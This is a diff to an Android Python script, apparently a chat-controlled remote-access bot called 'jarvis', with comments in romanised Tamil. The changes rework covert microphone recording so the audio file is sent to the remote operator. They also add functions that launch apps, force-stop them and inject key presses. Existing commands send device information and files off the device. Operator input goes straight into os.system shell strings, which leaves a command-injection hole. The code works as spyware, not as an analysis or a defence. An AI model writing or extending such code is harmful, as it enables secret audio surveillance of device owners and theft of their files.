@@ -1,4 +1,4 @@
-import time,subprocess,requests,os,platform,sys,threading,struct
+import time,subprocess,requests,os,platform,sys,threading
 from jnius import autoclass
 
 def send_message(message):
@@ -63,54 +63,65 @@ def notify_internet():
 
 def start_recording(sec=10):
     try:
-        sample_rate = 44100
-        file_path = "/storage/emulated/0/audio.wav"
-        AudioRecord = autoclass('android.media.AudioRecord')
-        AudioFormat = autoclass('android.media.AudioFormat')
+        # Android Native Classes-a edukkurom
+        MediaRecorder = autoclass('android.media.MediaRecorder')
         AudioSource = autoclass('android.media.MediaRecorder$AudioSource')
-        channel = AudioFormat.CHANNEL_IN_MONO
-        encoding = AudioFormat.ENCODING_PCM_16BIT
-        buffer_size = AudioRecord.getMinBufferSize(sample_rate, channel, encoding)
-        recorder = AudioRecord(
-            AudioSource.MIC,
-            sample_rate,
-            channel,
-            encoding,
-            buffer_size
-        )
-        buf = [0] * buffer_size
-        with open(file_path, "wb") as f:
-            f.write(b'\x00' * 44)
-            recorder.startRecording()
-            send_message(f"Recording {sec}s...")
-            start = time.time()
-            total_data = 0
-            while time.time() - start < sec:
-                read = recorder.read(buf, 0, buffer_size)
-                if read > 0:
-                    raw = struct.pack('<' + 'h'*read, *buf[:read])
-                    f.write(raw)
-                    total_data += len(raw)
-            recorder.stop()
-            recorder.release()
-            f.seek(0)
-            # WAV header
-            f.write(b'RIFF')
-            f.write(struct.pack('<I', total_data + 36))
-            f.write(b'WAVE')
-            f.write(b'fmt ')
-            f.write(struct.pack('<I', 16))
-            f.write(struct.pack('<H', 1))
-            f.write(struct.pack('<H', 1))
-            f.write(struct.pack('<I', sample_rate))
-            f.write(struct.pack('<I', sample_rate * 2))
-            f.write(struct.pack('<H', 2))
-            f.write(struct.pack('<H', 16))
-            f.write(b'data')
-            f.write(struct.pack('<I', total_data))
-        send_document(file_path, "File Saved")
+        OutputFormat = autoclass('android.media.MediaRecorder$OutputFormat')
+        AudioEncoder = autoclass('android.media.MediaRecorder$AudioEncoder')
+        Environment = autoclass('android.os.Environment')
+        PythonActivity = autoclass('org.kivy.android.PythonActivity')
+
+        # File save panna path ready pandrom (App-oda internal folder)
+        context = autoclass('org.kivy.android.PythonService').mService
+        save_dir = context.getExternalFilesDir(None).getAbsolutePath()
+        file_path = os.path.join(save_dir, "jarvis_record.m4a")
+
+        # Recorder setup pandrom
+        recorder = MediaRecorder()
+        recorder.setAudioSource(AudioSource.MIC) # Mic-la irundhu edu
+        recorder.setOutputFormat(OutputFormat.MPEG_4) # MP4 format
+        recorder.setAudioEncoder(AudioEncoder.AAC) # AAC Audio quality
+        recorder.setOutputFile(file_path) # Inga save pannu
+
+        send_message('Preparing Mic...')
+        recorder.prepare()
+        recorder.start()
+        send_message(f'Listening `{sec}`s...')
+
+        # 10 seconds record aagum
+        time.sleep(sec)
+
+        # Recording-a stop pandrom
+        recorder.stop()
+        recorder.release()
+        send_document(file_path,'Recording Saved Successfully')
+
     except Exception as error:
-        send_message(f"Recording Error: `{error}`")
+        send_message(f'Mic Problem: `{error}`')
+
+def start_activity(activity,cmd):
+    try:
+        time.sleep(1)
+        if activity == 'app':
+            command = f"monkey -p {cmd} -c android.intent.category.LAUNCHER 1 > /dev/null 2>&1"
+            send_message(f'Opening `{cmd}`...')
+            os.system(command)
+            send_message(f'App Opened.')
+        elif activity == 'close':
+            command = f"am force-stop {cmd}"
+            send_message(f'Closing `{cmd}`...')
+            os.system(command)
+            send_message('App Closed.')
+        elif activity == 'key':
+            command = f'input keyevent {int(cmd)}'
+            send_message(f'Executing Key {cmd}...')
+            os.system(command)
+            send_message('Key Executed.')
+        elif activity == 'record':
+            threading.Thread(target=start_recording,args=(int(cmd),),daemon=True).start()
+        else: send_message(f'invalid option for `start`')
+    except Exception as error:
+        send_message(f'Error `{activity}`: `{error}`')
 
 def gen_response(cmd):
     try:
@@ -121,10 +132,8 @@ def gen_response(cmd):
         if cmdlen == 1 and main.lower() == 'active': return {'result':f'`{device}` is active','type':'message'}
         elif cmdlen == 1 and main.lower() == 'sysinfo': return {'result':f'*Software*\n\nsystem: `{platform.system()}`\nrelease: `{platform.release()}`\nversion: `{platform.version()}`\nmachine: `{platform.machine()}`\n\n*Hardware*\n\nbrand: `{subprocess.getoutput("getprop ro.product.brand")}`\ndevice: `{subprocess.getoutput("getprop ro.product.device")}`\nandroid: `{subprocess.getoutput("getprop ro.build.version.release")}`\nmanufacturer: `{subprocess.getoutput("getprop ro.product.manufacturer")}`','type':'message'}
         elif cmdlen == 3 and main.lower() == 'start':
-            if parts[1] == 'record':
-                threading.Thread(target=start_recording,args=(int(parts[2]),),daemon=True).start()
-                return {'result':'`record` request sended','type':'message'}
-            else: return {'result':'invalid option for `start`','type':'message'}
+            threading.Thread(target=start_activity,args=(parts[1],parts[2],),daemon=True).start()
+            return {'result':f'`{parts[1]}` request sended','type':'message'}
         elif cmdlen == 3 and main.lower() == 'send':
             if not os.path.exists(parts[2]): return {'result':f'*status:* path not found `{parts[2]}`','type':'message'}
             file_details = subprocess.getoutput(f'stat {parts[2]}')
